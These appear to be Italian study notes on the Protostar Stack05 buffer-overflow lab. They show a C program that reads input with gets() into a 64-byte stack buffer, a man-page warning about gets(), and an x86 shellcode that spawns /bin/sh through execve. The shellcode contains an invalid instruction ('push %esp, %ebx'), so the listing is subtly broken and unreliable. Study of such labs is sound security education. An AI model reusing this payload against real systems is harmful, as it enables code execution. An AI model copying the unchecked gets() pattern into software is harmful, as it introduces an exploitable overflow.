- Qui ci sarebbero altri esercizi prima che non ho inserito per motivi di voglia e semplicità come quelli sulle sql inj
## Protostar - Stack05
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
- Viene allocato un buffer di 64 caratteri sullo stack
- Si riempie il buffer con dati letti da terminale
	- input non controllato
- **gets()**
	- gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with \0. **No check for buffer overrun is performed** (see BUGS below).
	- BUGS **Never use gets()**. Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer. It is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.

## Memory Layout
- TODO: aggiungere tutta la parte sul memory layout
## Shellcode
- "/bin/sh": devo codificare in memoria questa stringa
	- ricordiamoci che siamo in un contesto little endian
	- "//sh": codifico prima questi 4 byte
		- 0x68732F2F
	- "/bin"
		- 0x6E69622F
- shellcode:
```s
	shellcode:
		xor %eax, %eax //xorando due valori uguali ottengo 0
		push %eax //metto eax sullo stack
		push $0x68732F2F // //sh
		push $0x6E69622F
		push %esp, %ebx
		mov %eax, %ecx
		mov %eax, %edx
		mov $0xb, %al
		int $0x80
		xor %eax, %eax
		inc %eax
		int $0x80
```
